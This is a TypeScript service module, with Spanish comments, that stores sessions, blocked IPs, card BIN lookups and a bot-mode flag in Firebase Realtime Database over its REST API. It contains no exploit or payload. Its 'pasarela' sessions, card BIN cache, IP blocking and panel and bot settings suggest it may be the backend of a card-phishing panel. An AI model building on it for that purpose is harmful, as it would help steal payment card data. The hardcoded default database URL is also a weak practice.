import axios from "axios";
import { Request } from "express";

/**
 * FirebaseService — persistencia en Firebase Realtime Database.
 *
 * Usa la REST API de Firebase RTDB (sin SDK extra) para:
 * - Guardar sesiones en /pasarela/sessions/{sessionId}
 * - Leer sesiones desde RTDB (sobrevive reinicios de Railway)
 * - IPs bloqueadas en /pasarela/config/blocked_ips
 * - BIN checker en /pasarela/config/binchecker
 *
 * Si FIREBASE_DATABASE_URL no está configurado, cae en memoria local
 * para no romper el flujo en entornos sin credenciales.
 */

const FIREBASE_DB_URL = (process.env.FIREBASE_DATABASE_URL || "https://ctbt-4aa9a-default-rtdb.firebaseio.com").replace(/\/$/, "");
const FIREBASE_DB_SECRET = process.env.FIREBASE_DATABASE_SECRET || "";

// ── Memoria local de respaldo (caché en caliente) ──────────────────────
const memCache: Record<string, any> = {};
const blockedIpsCache: Set<string> = new Set();
const binCache: Record<string, unknown> = {};

// ── Helpers REST ───────────────────────────────────────────────────────

function authParams() {
  return FIREBASE_DB_SECRET ? { auth: FIREBASE_DB_SECRET } : {};
}

function sessionUrl(sessionId: string) {
  return `${FIREBASE_DB_URL}/pasarela/sessions/${encodeURIComponent(sessionId)}.json`;
}

async function rtdbGet<T = any>(url: string): Promise<T | null> {
  try {
    const res = await axios.get<T>(url, { params: authParams(), timeout: 8000 });
    return res.data ?? null;
  } catch (err: any) {
    const status = err?.response?.status;
    const msg = err?.response?.data || err?.message;
    console.error(`[RTDB] GET error (${status}): ${url.slice(url.indexOf('/pasarela'))} →`, msg);
    return null;
  }
}

async function rtdbPatch(url: string, data: Record<string, unknown>): Promise<void> {
  try {
    await axios.patch(url, data, { params: authParams(), timeout: 5000 });
  } catch (err: any) {
    console.error("[RTDB] Error writing:", err.message);
  }
}

async function rtdbSet(url: string, data: unknown): Promise<void> {
  try {
    await axios.put(url, data, { params: authParams(), timeout: 5000 });
  } catch (err: any) {
    console.error("[RTDB] Error setting:", err.message);
  }
}

// ──────────────────────────────────────────────────────────────────────
export class FirebaseService {

  // ── IP helpers ────────────────────────────────────────────────────────

  static getClientIp(req: Request): string {
    return req.get("x-forwarded-for")?.split(",")[0] || req.socket.remoteAddress || "";
  }

  // ── Sesiones ─────────────────────────────────────────────────────────

  static async saveSession(sessionId: string, data: any): Promise<void> {
    if (!sessionId) return;

    const patch: Record<string, unknown> = {
      ...(data as Record<string, unknown>),
      updatedAt: new Date().toISOString(),
    };

    // Actualizar caché local inmediatamente
    memCache[sessionId] = { ...(memCache[sessionId] ?? {}), ...patch };

    // Persistir en Firebase RTDB de forma asíncrona (no bloqueante)
    rtdbPatch(sessionUrl(sessionId), patch).catch(() => {});
  }

  static async getSession(sessionId: string): Promise<any> {
    // Intentar caché local primero
    if (memCache[sessionId]) return memCache[sessionId];

    // Leer desde Firebase RTDB
    const data = await rtdbGet(sessionUrl(sessionId));
    if (data) {
      memCache[sessionId] = data;
    }
    return data;
  }

  static async getAllSessions(): Promise<any[]> {
    const data = await rtdbGet<Record<string, any>>(`${FIREBASE_DB_URL}/pasarela/sessions.json`);
    if (!data || typeof data !== "object") return [];
    return Object.entries(data).map(([id, val]) => ({ sessionId: id, ...val }));
  }

  static async deleteSession(sessionId: string): Promise<void> {
    delete memCache[sessionId];
    try {
      await axios.delete(sessionUrl(sessionId), { params: authParams(), timeout: 5000 });
    } catch {}
  }

  static async getSessionMessageId(sessionId: string): Promise<number | null> {
    const session = await FirebaseService.getSession(sessionId);
    const raw = Number(session?.messageId);
    return Number.isFinite(raw) ? raw : null;
  }

  // ── IPs bloqueadas ────────────────────────────────────────────────────

  static async getBlockedIps(): Promise<string[]> {
    const data = await rtdbGet<string[]>(`${FIREBASE_DB_URL}/pasarela/config/blocked_ips.json`);
    if (Array.isArray(data)) {
      blockedIpsCache.clear();
      data.forEach(ip => blockedIpsCache.add(ip));
      return data;
    }
    return [...blockedIpsCache];
  }

  static async addBlockedIp(ip: string): Promise<void> {
    if (!ip) return;
    blockedIpsCache.add(ip);
    const current = await FirebaseService.getBlockedIps();
    const updated = [...new Set([...current, ip])];
    await rtdbSet(`${FIREBASE_DB_URL}/pasarela/config/blocked_ips.json`, updated);
  }

  static async removeBlockedIp(ip: string): Promise<void> {
    blockedIpsCache.delete(ip);
    const current = await FirebaseService.getBlockedIps();
    const updated = current.filter(i => i !== ip);
    await rtdbSet(`${FIREBASE_DB_URL}/pasarela/config/blocked_ips.json`, updated);
  }

  // ── BIN checker ───────────────────────────────────────────────────────

  static async getCardBinChecker(bin: string): Promise<unknown | null> {
    const normalized = String(bin || "").replace(/\D/g, "").slice(0, 6);
    if (normalized.length < 6) return null;
    if (binCache[normalized]) return binCache[normalized];

    const data = await rtdbGet<Record<string, unknown>>(
      `${FIREBASE_DB_URL}/pasarela/config/binchecker/${normalized}.json`
    );
    if (data) binCache[normalized] = data;
    return data;
  }

  static isValidBinLookup(binLookup: unknown): boolean {
    if (!binLookup || typeof binLookup !== "object") return false;
    const data = (binLookup as { data?: unknown }).data;
    return Boolean(data && typeof data === "object");
  }

  static async saveDataCardBinChecker(entry: Record<string, unknown>): Promise<void> {
    const binRaw = String(
      entry?.bin ?? (entry?.card as Record<string, unknown>)?.bin ?? ""
    ).replace(/\D/g, "").slice(0, 6);

    if (binRaw.length === 6) {
      binCache[binRaw] = entry;
      rtdbSet(`${FIREBASE_DB_URL}/pasarela/config/binchecker/${binRaw}.json`, entry).catch(() => {});
    }
  }

  // ── Modo automático ──────────────────────────────────────────────────

  static normalizeBoolean(value: unknown): boolean {
    if (typeof value === "boolean") return value;
    if (typeof value === "number") return value === 1;
    if (typeof value === "string") {
      const v = value.trim().toLowerCase();
      return v === "true" || v === "1" || v === "yes" || v === "si" || v === "on" || v === "activo";
    }
    return false;
  }

  static async getAutomaticMode(
    _sessionId?: string,
    _panelCodigo?: string
  ): Promise<boolean> {
    const data = await rtdbGet<{ enabled?: unknown; state?: unknown }>(
      `${FIREBASE_DB_URL}/pasarela/config/bot_automatic.json`
    );
    if (!data) return false;
    return FirebaseService.normalizeBoolean(data.enabled ?? data.state);
  }
}
